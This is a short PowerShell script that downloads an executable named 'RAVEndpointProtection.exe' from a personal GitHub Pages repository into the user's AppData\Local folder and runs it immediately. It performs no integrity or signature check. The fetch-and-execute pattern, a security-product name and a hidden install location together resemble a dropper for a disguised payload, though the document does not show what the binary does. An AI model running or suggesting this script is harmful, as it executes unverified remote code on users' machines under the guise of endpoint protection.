$x = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/RAVEndpointProtection.exe"
$y = "$env:USERPROFILE\AppData\Local\RAVEndpointProtection.exe"

Invoke-WebRequest -Uri $x -OutFile $y
Start-Process $y
